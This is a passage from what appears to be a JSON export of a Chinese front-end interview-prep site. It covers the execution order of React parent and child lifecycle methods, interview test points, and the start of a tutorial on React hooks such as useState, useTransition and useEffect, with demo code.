 padding: 20,\n  margin: 20,\n  backgroundColor: 'LightSkyBlue',\n};\n\nconst NAME = 'Child 组件：';\n\nexport default class Child extends Component {\n  constructor() {\n    super();\n    console.log(NAME, 'constructor');\n    this.state = {\n      counter: 0,\n    };\n  }\n\n  static getDerivedStateFromProps(nextProps, prevState) {\n    console.log(NAME, 'getDerivedStateFromProps');\n    return null;\n  }\n\n  componentDidMount() {\n    console.log(NAME, 'componentDidMount');\n  }\n\n  shouldComponentUpdate(nextProps, nextState) {\n    console.log(NAME, 'shouldComponentUpdate');\n    return true;\n  }\n\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    console.log(NAME, 'getSnapshotBeforeUpdate');\n    return null;\n  }\n\n  componentDidUpdate(prevProps, prevState, snapshot) {\n    console.log(NAME, 'componentDidUpdate');\n  }\n\n  componentWillUnmount() {\n    console.log(NAME, 'componentWillUnmount');\n  }\n\n  changeCounter = () => {\n    let { counter } = this.state;\n    this.setState({\n      counter: ++counter,\n    });\n  };\n\n  render() {\n    console.log(NAME, 'render');\n    const { count } = this.props;\n    const { counter } = this.state;\n    return (\n      <div style={childStyle}>\n        <h3>子组件</h3>\n        <p>父组件传过来的属性 count ： {count}</p>\n        <p>子组件自身状态 counter ： {counter}</p>\n        <Button onClick={this.changeCounter}>改变自身状态 counter</Button>\n      </div>\n    );\n  }\n}\n```\n\n#### 界面展示\n\n![](https://static.ecool.fun//article/28cfcffa-ca4e-44b1-8c3c-6c2dbcf18fed.awebp)\n\n#### 从五种组件状态改变的时机来探究生命周期的执行顺序\n\n##### 一、父子组件初始化\n\n父子组件第一次进行渲染加载时：\n\n控制台的打印顺序为：\n\n+   Parent 组件： constructor()\n+   Parent 组件： getDerivedStateFromProps()\n+   Parent 组件： render()\n+   Child 组件： constructor()\n+   Child 组件： getDerivedStateFromProps()\n+   Child 组件： render()\n+   Child 组件： componentDidMount()\n+   Parent 组件： componentDidMount()\n\n##### 二、子组件修改自身状态 state\n\n点击子组件 \\[改变自身状态counter\\] 按钮，其 \\[自身状态counter\\] 值会 +1, 此时控制台的打印顺序为：\n\n+   Child 组件： getDerivedStateFromProps()\n    \n+   Child 组件： shouldComponentUpdate()\n    \n+   Child 组件： render()\n    \n+   Child 组件： getSnapshotBeforeUpdate()\n    \n+   Child 组件： componentDidUpdate()\n    \n\n##### 三、修改父组件中传入子组件的 props\n\n点击父组件中的 \\[改变传给子组件的属性 count\\] 按钮，则界面上 \\[父组件传过来的属性 count\\] 的值会 + 1，控制台的打印顺序为：\n\n+   Parent 组件： getDerivedStateFromProps()\n    \n+   Parent 组件： shouldComponentUpdate()\n    \n+   Parent 组件： render()\n    \n+   Child 组件： getDerivedStateFromProps()\n    \n+   Child 组件： shouldComponentUpdate()\n    \n+   Child 组件： render()\n    \n+   Child 组件： getSnapshotBeforeUpdate()\n    \n+   Parent 组件： getSnapshotBeforeUpdate()\n    \n+   Child 组件： componentDidUpdate()\n    \n+   Parent 组件： componentDidUpdate()\n    \n\n##### 四、卸载子组件\n\n点击父组件中的 \\[卸载 / 挂载子组件\\] 按钮，则界面上子组件会消失，控制台的打印顺序为：\n\n+   Parent 组件： getDerivedStateFromProps()\n    \n+   Parent 组件： shouldComponentUpdate()\n    \n+   Parent 组件： render()\n    \n+   Parent 组件： getSnapshotBeforeUpdate()\n    \n+   Child 组件： componentWillUnmount()\n    \n+   Parent 组件： componentDidUpdate()\n    \n\n##### 五、重新挂载子组件\n\n再次点击父组件中的 \\[卸载 / 挂载子组件\\] 按钮，则界面上子组件会重新渲染出来，控制台的打印顺序为：\n\n+   Parent 组件： getDerivedStateFromProps()\n    \n+   Parent 组件： shouldComponentUpdate()\n    \n+   Parent 组件： render()\n    \n+   Child 组件： constructor()\n    \n+   Child 组件： getDerivedStateFromProps()\n    \n+   Child 组件： render()\n    \n+   Parent 组件： getSnapshotBeforeUpdate()\n    \n+   Child 组件： componentDidMount()\n    \n+   Parent 组件： componentDidUpdate()\n    \n\n#### 父子组件生命周期执行顺序总结：\n\n+   当子组件自身状态改变时，不会对父组件产生副作用的情况下，父组件不会进行更新，即不会触发父组件的生命周期\n    \n+   当父组件中状态发生变化（包括子组件的挂载以及卸载）时，会触发自身对应的生命周期以及子组件的更新\n    \n    +   `render` 以及 `render` 之前的生命周期，则 父组件先执行\n    +   `render` 以及 `render`之后的声明周期，则子组件先执行，并且是与父组件交替执行\n    \n    当子组件进行卸载时，只会执行自身的 `componentWillUnmount` 生命周期，不会再触发别的生命周期\n",
    "testPoint": "## **1. React 生命周期的基本概念**\n面试官通常会考察你是否理解 React 组件的生命周期，以及生命周期方法在不同阶段的作用。\n\n**考察点：**\n- React 组件的生命周期有哪些阶段？\n- 每个生命周期方法的触发时机和作用？\n- 类组件生命周期 vs. Hooks 组件生命周期的区别？\n\n**示例问题：**\n- 组件的生命周期可以分为哪几个阶段？\n- React 16 之后有哪些生命周期方法被废弃或替换？\n\n---\n\n## **2. React 类组件的生命周期**\n**考察点：**\n- 挂载（Mount）、更新（Update）、卸载（Unmount）阶段的生命周期方法\n- `componentDidMount()` vs. `componentDidUpdate()` 的区别\n- `shouldComponentUpdate()` 如何优化性能\n- `componentWillUnmount()` 在什么场景下使用\n\n**示例问题：**\n- `componentDidMount` 和 `componentWillUnmount` 分别在什么时候执行？\n- `shouldComponentUpdate` 的作用是什么？可以返回 `false` 吗？\n- `componentDidUpdate` 里面如果直接 `setState` 会有什么后果？\n\n**类组件生命周期概览：**\n```jsx\nclass Example extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n    console.log('constructor');\n  }\n\n  static getDerivedStateFromProps(props, state) {\n    console.log('getDerivedStateFromProps');\n    return null;\n  }\n\n  componentDidMount() {\n    console.log('componentDidMount');\n  }\n\n  shouldComponentUpdate(nextProps, nextState) {\n    console.log('shouldComponentUpdate');\n    return true;\n  }\n\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    console.log('getSnapshotBeforeUpdate');\n    return null;\n  }\n\n  componentDidUpdate(prevProps, prevState, snapshot) {\n    console.log('componentDidUpdate');\n  }\n\n  componentWillUnmount() {\n    console.log('componentWillUnmount');\n  }\n\n  render() {\n    console.log('render');\n    return (\n      <div>\n        <p>Count: {this.state.count}</p>\n        <button onClick={() => this.setState({ count: this.state.count + 1 })}>\n          Increase\n        </button>\n      </div>\n    );\n  }\n}\n```\n\n**执行顺序（挂载、更新、卸载阶段）：**\n1. **挂载阶段（Mount）**\n   - `constructor()`\n   - `getDerivedStateFromProps()`\n   - `render()`\n   - `componentDidMount()`\n   \n2. **更新阶段（Update）**\n   - `getDerivedStateFromProps()`\n   - `shouldComponentUpdate()`\n   - `render()`\n   - `getSnapshotBeforeUpdate()`\n   - `componentDidUpdate()`\n   \n3. **卸载阶段（Unmount）**\n   - `componentWillUnmount()`\n\n---\n\n## **3. React 16 后废弃的生命周期**\n**考察点：**\n- `componentWillMount()`、`componentWillReceiveProps()`、`componentWillUpdate()` 为什么被废弃？\n- `getDerivedStateFromProps()` 和 `getSnapshotBeforeUpdate()` 如何替代？\n\n**示例问题：**\n- 为什么 React 16+ 之后废弃了 `componentWillReceiveProps`？\n- `getDerivedStateFromProps` 适合什么场景？\n- `getSnapshotBeforeUpdate` 的返回值如何使用？\n\n**React 16+ 之后的新生命周期替代方案**\n| 废弃方法 | 替代方法 |\n|---------|---------|\n| `componentWillMount()` | 使用 `componentDidMount()` |\n| `componentWillReceiveProps()` | 使用 `getDerivedStateFromProps()` |\n| `componentWillUpdate()` | 使用 `getSnapshotBeforeUpdate()` |\n\n---\n\n## **4. React Hooks 组件的生命周期**\nReact Hooks 没有传统的生命周期方法，而是通过 `useEffect` 来替代类组件的生命周期逻辑。\n\n**考察点：**\n- `useEffect()` 如何模拟 `componentDidMount()`、`componentDidUpdate()` 和 `componentWillUnmount()`？\n- `useEffect()` 的依赖数组 `[ ]`、`[deps]` 和无依赖时的区别？\n- 如何使用 `useLayoutEffect()`？\n\n**示例问题：**\n- `useEffect(() => {}, [])` 和 `useEffect(() => {}, [deps])` 的区别？\n- 如何用 `useEffect` 模拟 `componentWillUnmount()`？\n- `useLayoutEffect` 和 `useEffect` 的区别？\n\n**Hooks 组件示例：**\n```jsx\nimport React, { useState, useEffect } from 'react';\n\nfunction Example() {\n  const [count, setCount] = useState(0);\n\n  // 模拟 componentDidMount\n  useEffect(() => {\n    console.log('Component mounted');\n    return () => {\n      console.log('Component will unmount'); // 模拟 componentWillUnmount\n    };\n  }, []);\n\n  // 模拟 componentDidUpdate\n  useEffect(() => {\n    console.log('Count updated:', count);\n  }, [count]);\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increase</button>\n    </div>\n  );\n}\n```\n\n**Hooks 版本的生命周期模拟：**\n| 类组件方法 | Hooks 替代方案 |\n|-----------|--------------|\n| `componentDidMount()` | `useEffect(() => {}, [])` |\n| `componentDidUpdate()` | `useEffect(() => {}, [deps])` |\n| `componentWillUnmount()` | `useEffect(() => { return () => {}; }, [])` |\n\n---\n\n## **5. React 生命周期的应用场景**\n**考察点：**\n- 在 `componentDidMount()` 中做 API 请求的原因？\n- 在 `componentWillUnmount()` 中做清理工作（如清除定时器、取消订阅）？\n- 为什么要在 `useEffect` 里返回一个 cleanup 函数？\n\n**示例问题：**\n- 你会在哪个生命周期方法里请求数据？为什么？\n- `useEffect` 里返回一个 `return` 函数的作用是什么？\n\n---\n\n## **6. React 生命周期的性能优化**\n**考察点：**\n- `shouldComponentUpdate()` 如何优化性能？\n- `React.memo` 和 `useMemo()` 如何减少不必要的渲染？\n- `useCallback()` 如何避免子组件不必要的重新渲染？\n\n**示例问题：**\n- `shouldComponentUpdate()` 返回 `false` 会发生什么？\n- `useMemo()` 什么时候使用，能解决什么问题？\n- `React.memo` 是如何优化组件渲染的？\n\n---\n\n## **7. React 18 并发模式下的生命周期**\nReact 18 引入了 **并发模式（Concurrent Mode）**，生命周期可能会被 **多次执行**。\n\n**考察点：**\n- `useEffect()` 在 React 18 并发模式下的执行次数？\n- `useLayoutEffect()` 什么时候使用？\n\n**示例问题：**\n- 为什么 React 18 在 `StrictMode` 下会多次执行 `useEffect`？\n- `useLayoutEffect()` 和 `useEffect()` 在 React 18 中的执行顺序有什么区别？",
    "exerciseKeyList": "[\"7ddb0505-9a75-4d2b-acb5-9d3bebdcf07d\",\"460a9714-1001-4beb-b12a-be8fec732879\",\"87f39c64-2eb7-497f-b78a-4a84decd642d\",\"35528a50-c820-4037-beec-ec309c4f2a46\",\"f59d29a2-7ff8-41ca-8176-a24f1ca6d0f5\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:18:14.000Z",
    "updateAt": "2025-02-08T01:13:30.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "35528a50-c820-4037-beec-ec309c4f2a46",
        "title": "React Hooks当中的useEffect是如何区分生命周期钩子的\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:29:15.000Z",
        "updateAt": "2024-08-10T17:05:10.000Z"
      },
      {
        "exerciseKey": "460a9714-1001-4beb-b12a-be8fec732879",
        "title": "使用 React hooks 怎么实现类里面的所有生命周期？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-01-09T12:00:38.000Z",
        "updateAt": "2024-08-10T21:50:10.000Z"
      },
      {
        "exerciseKey": "7ddb0505-9a75-4d2b-acb5-9d3bebdcf07d",
        "title": "React 为什么要废弃  componentWillMount、componentWillReceiveProps、componentWillUpdate 这三个生命周期钩子？它们有哪些问题呢？React 又是如何解决的呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-03-18T02:39:39.000Z",
        "updateAt": "2024-07-22T10:11:32.000Z"
      },
      {
        "exerciseKey": "87f39c64-2eb7-497f-b78a-4a84decd642d",
        "title": "react中，父子组件的生命周期执行顺序是怎么样的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-04-05T09:04:46.000Z",
        "updateAt": "2024-07-23T10:19:41.000Z"
      },
      {
        "exerciseKey": "f59d29a2-7ff8-41ca-8176-a24f1ca6d0f5",
        "title": "简述下 React 的生命周期？每个生命周期都做了什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:23:39.000Z",
        "updateAt": "2024-08-10T17:04:59.000Z"
      }
    ]
  },
  "197": {
    "id": 197,
    "tagId": 13,
    "title": "react hooks",
    "explanation": "## 一 前言\n\nReact hooks是react16.8 以后，react新增的钩子API，目的是增加代码的可复用性，逻辑性，弥补无状态组件没有生命周期，没有数据管理状态state的缺陷。\n\n本章节将介绍目前 React 提供的所有 hooks ，介绍其功能类型和基本使用方法。\n\n\n### 1.1 技术背景\n\n**react hooks 解决了什么问题？**\n\n先设想一下，如果没有 Hooks，函数组件能够做的只是接受 Props、渲染 UI ，以及触发父组件传过来的事件。所有的处理逻辑都要在类组件中写，这样会使 class 类组件内部错综复杂，每一个类组件都有一套独特的状态，相互之间不能复用，即便是 React 之前出现过 mixin 等复用方式，但是伴随出 mixin 模式下隐式依赖，代码冲突覆盖等问题，也不能成为 React 的中流砥柱的逻辑复用方案。所以 React 放弃 mixin 这种方式。\n\n类组件是一种面向对象思想的体现，类组件之间的状态会随着功能增强而变得越来越臃肿，代码维护成本也比较高，而且不利于后期 tree shaking。所以有必要做出一套函数组件代替类组件的方案，于是 Hooks 也就理所当然的诞生了。\n\n所以 Hooks 出现本质上原因是：\n\n-   **让函数组件也能做类组件的事，有自己的状态，可以处理一些副作用，能获取 ref ，也能做数据缓存。**\n-   **解决逻辑复用难的问题。**\n-   **放弃面向对象编程，拥抱函数式编程。**\n\n**为什么要使用自定义 Hooks ？**\n\n自定义 hooks 是在 React Hooks 基础上的一个拓展，可以根据业务需求制定满足业务需要的组合 hooks ，更注重的是逻辑单元。通过业务场景不同，到底需要React Hooks 做什么，怎么样把一段逻辑封装起来，做到复用，这是自定义 hooks 产生的初衷。\n\n自定义 hooks 也可以说是 React Hooks 聚合产物，其内部有一个或者多个 React Hooks 组成，用于解决一些复杂逻辑。\n\n### 1.2 技术愿景\n\n目前 hooks 已经成为 React 主流的开发手段，React 生态也日益朝着 hooks 方向发展，比如 React Router, React Redux 等， hooks 也更契合 React 生态库的应用。\n\n随着项目功能模块越来越复杂，一些公共逻辑不能有效的复用，这些逻辑需要和业务代码强关联到一起，这样会让整体工程臃肿，功能不能复用，如果涉及到修改逻辑，那么有可能牵一发动全身。\n\n所以有必要使用自定义 hooks 的方式，hooks 可以把重复的逻辑抽离出去，根据需要创建和业务功能绑定的业务型 hooks ，或者是根据具体功能创建的功能型 hooks 。\n\n### 1.3 功能概览\n\n在 React 的世界中，不同的 hooks 使命也是不同的，我这里对 React hooks 按照功能分类，分成了 **数据更新驱动**，**状态获取与传递，执行副作用，状态派生与保存，和工具类型，** 具体功能划分和使用场景如下：\n\n![WechatIMG32.png](https://static.ecool.fun//article/9964d71c-2ae3-4bc5-894f-def89c667f8b.awebp)\n\n## 二 hooks 之数据更新驱动\n\n### 2.1 useState\n\nuseState 可以使函数组件像类组件一样拥有 state，函数组件通过 useState 可以让组件重新渲染，更新视图。\n\n**useState 基础介绍：**\n\n```js\nconst [ ①state , ②dispatch ] = useState(③initData)\n```\n\n① state，目的提供给 UI ，作为渲染视图的数据源。\n\n② dispatchAction 改变 state 的函数，可以理解为推动函数组件渲染的渲染函数。\n\n③ initData 有两种情况，第一种情况是非函数，将作为 state 初始化的值。 第二种情况是函数，函数的返回值作为 useState 初始化的值。\n\n**useState 基础用法：**\n\n```js\nconst DemoState = (props) => {\n   /* number为此时state读取值 ，setNumber为派发更新的函数 */\n   let [number, setNumber] = useState(0) /* 0为初始值 */\n   return (<div>\n       <span>{ number }</span>\n       <button onClick={ ()=> {\n         setNumber(number+1)\n         console.log(number) /* 这里的number是不能够即使改变的  */\n       } } ></button>\n   </div>)\n}\n```\n\n**useState 注意事项：**\n\n① 在函数组件一次执行上下文中，state 的值是固定不变的。\n\n```js\nfunction Index(){\n    const [ number, setNumber ] = React.useState(0)\n    const handleClick = () => setInterval(()=>{\n        // 此时 number 一直都是 0\n        setNumber(number + 1 ) \n    },1000)\n    return <button onClick={ handleClick } > 点击 { number }</button>\n}\n```\n\n② 如果两次 dispatchAction 传入相同的 state 值，那么组件就不会更新。\n\n```js\nexport default function Index(){\n    const [ state  , dispatchState ] = useState({ name:'alien' })\n    const  handleClick = ()=>{ // 点击按钮，视图没有更新。\n        state.name = 'Alien'\n        dispatchState(state) // 直接改变 `state`，在内存中指向的地址相同。\n    }\n    return <div>\n         <span> { state.name }</span>\n        <button onClick={ handleClick }  >changeName++</button>\n    </div>\n}\n```\n\n③ 当触发 dispatchAction 在当前执行上下文中获取不到最新的 state, 只有再下一次组件 rerender 中才能获取到。\n\n### 2.2 useReducer\n\nuseReducer 是 react-hooks 提供的能够在无状态组件中运行的类似redux的功能 api 。\n\n**useReducer 基础介绍：**\n\n```js\nconst [ ①state , ②dispatch ] = useReducer(③reducer)\n```\n\n① 更新之后的 state 值。\n\n② 派发更新的 dispatchAction 函数, 本质上和 useState 的 dispatchAction 是一样的。\n\n③ 一个函数 reducer ，我们可以认为它就是一个 redux 中的 reducer , reducer的参数就是常规reducer里面的state和action, 返回改变后的state, 这里有一个需要注意的点就是：**如果返回的 state 和之前的 state ，内存指向相同，那么组件将不会更新。**\n\n**useReducer 基础用法：**\n\n```js\nconst DemoUseReducer = ()=>{\n    /* number为更新后的state值,  dispatchNumbner 为当前的派发函数 */\n   const [ number , dispatchNumbner ] = useReducer((state,action)=>{\n       const { payload , name  } = action\n       /* return的值为新的state */\n       switch(name){\n           case 'add':\n               return state + 1\n           case 'sub':\n               return state - 1 \n           case 'reset':\n             return payload       \n       }\n       return state\n   },0)\n   return <div>\n      当前值：{ number }\n      { /* 派发更新 */ }\n      <button onClick={()=>dispatchNumbner({ name:'add' })} >增加</button>\n      <button onClick={()=>dispatchNumbner({ name:'sub' })} >减少</button>\n      <button onClick={()=>dispatchNumbner({ name:'reset' ,payload:666 })} >赋值</button>\n      { /* 把dispatch 和 state 传递给子组件  */ }\n      <MyChildren  dispatch={ dispatchNumbner } State={{ number }} />\n   </div>\n}\n```\n\n### 2.3 useSyncExternalStore\n\nuseSyncExternalStore 的诞生并非偶然，和 v18 的更新模式下外部数据的 tearing 有着十分紧密的关联。useSyncExternalStore 能够让 React 组件在 concurrent 模式下安全地有效地读取外接数据源，在组件渲染过程中能够检测到变化，并且在数据源发生变化的时候，能够调度更新。当读取到外部状态发生了变化，会触发一个强制更新，来保证结果的一致性。\n\n**useSyncExternalStore 基础介绍：**\n\n```js\nuseSyncExternalStore(\n    subscribe,\n    getSnapshot,\n    getServerSnapshot\n)\n```\n\n① subscribe 为订阅函数，当数据改变的时候，会触发 subscribe，在 useSyncExternalStore 会通过带有记忆性的 getSnapshot 来判别数据是否发生变化，如果发生变化，那么会强制更新数据。\n\n② getSnapshot 可以理解成一个带有记忆功能的选择器。当 store 变化的时候，会通过 getSnapshot 生成新的状态值，这个状态值可提供给组件作为数据源使用，getSnapshot 可以检查订阅的值是否改变，改变的话那么会触发更新。\n\n③ getServerSnapshot 用于 hydration 模式下的 getSnapshot。\n\n**useSyncExternalStore 基础用法：**\n\n```js\nimport { combineReducers , createStore  } from 'redux'\n\n/* number Reducer */\nfunction numberReducer(state=1,action){\n    switch (action.type){\n      case 'ADD':\n        return state + 1\n      case 'DEL':\n        return state - 1\n      default:\n        return state\n    }\n}\n\n/* 注册reducer */\nconst rootReducer = combineReducers({ number:numberReducer  })\n/* 创建 store */\nconst store = createStore(rootReducer,{ number:1  })\n\nfunction Index(){\n    /* 订阅外部数据源 */\n    const state = useSyncExternalStore(store.subscribe,() => store.getState().number)\n    console.log(state)\n    return <div>\n        {state}\n        <button onClick={() => store.dispatch({ type:'ADD' })} >点击</button>\n    </div>\n}\n```\n\n点击按钮，会触发 reducer ，然后会触发 store.subscribe 订阅函数，执行 getSnapshot 得到新的 number ，判断 number 是否发生变化，如果变化，触发更新。\n\n### 2.4 useTransition\n\n在 React v18 中，有一种新概念叫做过渡任务，这种任务是对比立即更新任务而产生的，通常一些影响用户交互直观响应的任务，例如按键，点击，输入等，这些任务需要视图上立即响应，所以可以称之为立即更新的任务，但是有一些更新不是那么急迫，比如页面从一个状态过渡到另外一个状态，这些任务就叫做过渡任务。 打个比方如下图当点击 tab 从 tab1 切换到 tab2 的时候，本质上产生了两个更新任务。\n\n-   第一个就是 hover 状态由 tab1 变成 tab2。\n    \n-   第二个就是内容区域由 tab1 内容变换到 tab2 内容。\n    \n\n这两个任务，用户肯定希望 hover 状态的响应更迅速，而内容的响应有可能还需要请求数据等操作，所以更新状态并不是立马生效，通常还会有一些 loading 效果。所以第一个任务作为**立即执行任务**，而第二个任务就可以视为**过渡任务**。\n\n![WechatIMG6496.jpeg](https://static.ecool.fun//article/1b4dfcaf-111e-403c-8141-b240478ba82a.awebp)\n\n**useTransition 基础介绍：**\n\nuseTransition 执行返回一个数组。数组有两个状态值：\n\n-   第一个是，当处于过渡状态的标志——isPending。\n-   第二个是一个方法，可以理解为上述的 startTransition。可以把里面的更新任务变成过渡任务。\n\n```js\nimport { useTransition } from 'react' \n/* 使用 */\nconst  [ isPending , startTransition ] = useTransition ()\n```\n\n**useTransition 基础用法：**\n\n除了上述切换 tab 场景外，还有很多场景非常适合 useTransition 产生的过渡任务，比如输入内容，实时搜索并展示数据，这本质上也是有两个优先级的任务，第一个任务就是受控表单的实时响应；第二个就是输入内容改变,数据展示的变化。那么接下来我们写一个 demo 来看一下 useTransition 的基本使用。\n\n```js\n/* 模拟数据 */\nconst mockList1 = new Array(10000).fill('tab1').map((item,index)=>item+'--'+index )\nconst mockList2 = new Array(10000).fill('tab2').map((item,index)=>item+'--'+index )\nconst mockList3 = new Array(10000).fill('tab3').map((item,index)=>item+'--'+index )\n\nconst tab = {\n  tab1: mockList1,\n  tab2: mockList2,\n  tab3: mockList3\n}\n\nexport default function Index(){\n  const [ active, setActive ] = React.useState('tab1') //需要立即响应的任务，立即更新任务\n  const [ renderData, setRenderData ] = React.useState(tab[active]) //不需要立即响应的任务，过渡任务\n  const [ isPending,startTransition  ] = React.useTransition() \n  const handleChangeTab = (activeItem) => {\n     setActive(activeItem) // 立即更新\n     startTransition(()=>{ // startTransition 里面的任务优先级低\n       setRenderData(tab[activeItem])\n     })\n  }\n  return <div>\n    <div className='tab' >\n       { Object.keys(tab).map((item)=> <span className={ active === item && 'active' } onClick={()=>handleChangeTab(item)} >{ item }</span> ) }\n    </div>\n    <ul className='content' >\n       { isPending && <div> loading... </div> }\n       { renderData.map(item=> <li key={item} >{item}</li>) }\n    </ul>\n  </div>\n}\n```\n\n如上当切换 tab 的时候，产生了两个优先级任务，第一个任务是 setActive 控制 tab active 状态的改变，第二个任务为 setRenderData 控制渲染的长列表数据 （在现实场景下长列表可能是一些数据量大的可视化图表）。\n\n### 2.5 useDeferredValue\n\nReact 18 提供了 useDeferredValue 可以让状态滞后派生。useDeferredValue 的实现效果也类似于 transtion，当迫切的任务执行后，再得到新的状态，而这个新的状态就称之为 DeferredValue。\n\n**useDeferredValue 基础介绍：**\n\nuseDeferredValue 和上述 useTransition 本质上有什么异同呢？\n\n  \n**相同点：** useDeferredValue 本质上和内部实现与 useTransition 一样都是标记成了过渡更新任务。\n\n**不同点：** useTransition 是把 startTransition 内部的更新任务变成了过渡任务transtion,而 useDeferredValue 是把原值通过过渡任务得到新的值，这个值作为延时状态。 一个是处理一段逻辑，另一个是生产一个新的状态。\n\nuseDeferredValue 接受一个参数 value ，一般为可变的 state , 返回一个延时状态 deferrredValue。\n\n```js\nconst deferrredValue = React.useDeferredValue(value)\n```\n\n**useDeferredValue 基础用法：**\n\n接下来把上边那个例子用 useDeferredValue 来实现。\n\n```js\nexport default function Index(){\n  const [ active, setActive ] = React.useState('tab1') //需要立即响应的任务，立即更新任务\n  const deferActive = React.useDeferredValue(active) // 把状态延时更新，类似于过渡任务\n  const handleChangeTab = (activeItem) => {\n     setActive(activeItem) // 立即更新\n  }\n  const renderData = tab[deferActive] // 使用滞后状态\n  return <div>\n    <div className='tab' >\n       { Object.keys(tab).map((item)=> <span className={ active === item && 'active' } onClick={()=>handleChangeTab(item)} >{ item }</span> ) }\n    </div>\n    <ul className='content' >\n       { renderData.map(item=> <li key={item} >{item}</li>) }\n    </ul>\n  </div>\n  }\n```\n\n如上 active 为正常改变的状态，deferActive 为滞后的 active 状态，我们使用正常状态去改变 tab 的 active 状态，使用滞后的状态去更新视图，同样达到了提升用户体验的作用。\n\n## 三 hooks 之执行副作用\n\n### 3.1 useEffect\n\nReact hooks也提供了 api ，用于弥补函数组件没有生命周期的缺陷。其本质主要是运用了 hooks 里面的 useEffect ， useLayoutEffect，还有 useInsertionEffect。其中最常用的就是 useEffect 。我们首先来看一下 useEffect 的使用。\n\n**useEffect 基础介绍：**\n\n```js\nuseEffect(()=>{\n    return destory\n},dep)\n```\n\nuseEffect 第一个参数 callback, 返回的 destory ， destory 作为下一次callback执行之前调用，用于清除上一次 callback 产生的副作用。\n\n第二个参数作为依赖项，是一个数组，可以有多个依赖项，依赖项改变，执行上一次callback 返回的 destory ，和执行新的 effect 第一个参数 callback 。\n\n对于 useEffect 执行， React 处理逻辑是采用异步调用 ，对于每一个 effect 的 callback， React 会向 setTimeout回调函数一样，放入任务队列，等到主线程任务完成，DOM 更新，js 执行完成，视图绘制完毕，才执行。所以 effect 回调函数不会阻塞浏览器绘制视图。\n\n**useEffect 基础用法：**\n\n```js\n/* 模拟数据交互 */\nfunction getUserInfo(a){\n    return new Promise((resolve)=>{\n        setTimeout(()=>{ \n           resolve({\n               name:a,\n               age:16,\n           }) \n        },500)\n    })\n}\n\nconst Demo = ({ a }) => {\n    const [ userMessage , setUserMessage ] :any= useState({})\n    const div= useRef()\n    const [number, setNumber] = useState(0)\n    /* 模拟事件监听处理函数 */\n    const handleResize =()=>{}\n    /* useEffect使用 ，这里如果不加限制 ，会是函数重复执行，陷入死循环*/\n    useEffect(()=>{\n       /* 请求数据 */\n       getUserInfo(a).then(res=>{\n           setUserMessage(res)\n       })\n       /* 定时器 延时器等 */\n       const timer = setInterval(()=>console.log(666),1000)\n       /* 操作dom  */\n       console.log(div.current) /* div */\n       /* 事件监听等 */\n       window.addEventListener('resize', handleResize)\n         /* 此函数用于清除副作用 */\n       return function(){\n           clearInterval(timer) \n           window.removeEventListener('resize', handleResize)\n       }\n    /* 只有当props->a和state->number改变的时候 ,useEffect副作用函数重新执行 ，如果此时数组为空[]，证明函数只有在初始化的时候执行一次相当于componentDidMount */\n    },[ a ,number ])\n    return (<div ref={div} >\n        <span>{ userMessage.name }</span>\n        <span>{ userMessage.age }</span>\n        <div onClick={ ()=> setNumber(1) } >{ number }</div>\n    </div>)\n}\n```\n\n如上在 useEffect 中做的功能如下：\n\n-   ① 请求数据。\n-   ② 设置定时器,延时器等。\n-   ③ 操作 dom , 在 React Native 中可以通过 ref 获取元素位置信息等内容。\n-   ④ 注册事件监听器, 事件绑定，在 React Native 中可以注册 NativeEventEmitter 。\n-   ⑤ 还可以清除定时器，延时器，解绑事件监听器等。\n\n### 3.2 useLayoutEffect\n\n**useLayoutEffect 基础介绍：**\n\nuseLayoutEffect 和 useEffect 不同的地方是采用了同步执行，那么和useEffect有什么区别呢？\n\n① 首先 useLayoutEffect 是在 DOM 更新之后，浏览器绘制之前，这样可以方便修改 DOM，获取 DOM 信息，这样浏览器只会绘制一次，如果修改 DOM 布局放在 useEffect ，那 useEffect 执行是在浏览器绘制视图之后，接下来又改 DOM ，就可能会导致浏览器再次回流和重绘。而且由于两次绘制，视图上可能会造成闪现突兀的效果。\n\n② useLayoutEffect callback 中代码执行会阻塞浏览器绘制。\n\n**useEffect 基础用法：**\n\n```js\nconst DemoUseLayoutEffect = () => {\n    const target = useRef()\n    useLayoutEffect(() => {\n        /*我们需要在dom绘制之前，移动dom到制定位置*/\n        const { x ,y } = getPositon() /* 获取要移动的 x,y坐标 */\n        animate(target.current,{ x,y })\n    }, []);\n    return (\n        <div >\n            <span ref={ target } className=\"animate\"></span>\n        </div>\n    )\n}\n```\n\n### 3.3 useInsertionEffect\n\n**useInsertionEffect 基础介绍：**\n\nuseInsertionEffect 是在 React v18 新添加的 hooks ，它的用法和 useEffect 和 useLayoutEffect 一样。那么这个 hooks 用于什么呢?\n\n在介绍 useInsertionEffect 用途之前，先看一下 useInsertionEffect 的执行时机。\n\n```js\nReact.useEffect(()=>{\n    console.log('useEffect 执行')\n},[])\n\nReact.useLayoutEffect(()=>{\n    console.log('useLayoutEffect 执行')\n},[])\n\nReact.useInsertionEffect(()=>{\n    console.log('useInsertionEffect 执行')\n},[])\n```\n\n打印： useInsertionEffect 执行 -> useLayoutEffect 执行 -> useEffect 执行\n\n可以看到 useInsertionEffect 的执行时机要比 useLayoutEffect 提前，useLayoutEffect 执行的时候 DOM 已经更新了，但是在 useInsertionEffect 的执行的时候，DOM 还没有更新。本质上 useInsertionEffect 主要是解决 CSS-in-JS 在渲染中注入样式的性能问题。这个 hooks 主要是应用于这个场景，在其他场景下 React 不期望用这个 hooks 。\n\n**useInsertionEffect 模拟使用：**\n\n```js\nexport default function Index(){\n\n  React.useInsertionEffect(()=>{\n     /* 动态创建 style 标签插入到 head 中 */\n     const style = document.createElement('style')\n     style.innerHTML = `\n       .css-in-js{\n         color: red;\n         font-size: 20px;\n       }\n     `\n     document.head.appendChild(style)\n  },[])\n\n  return <div className=\"css-in-js\" > hello , useInsertionEffect </div>\n}\n```\n\n如上模拟了 useInsertionEffect 的使用。\n\n## 四 hooks 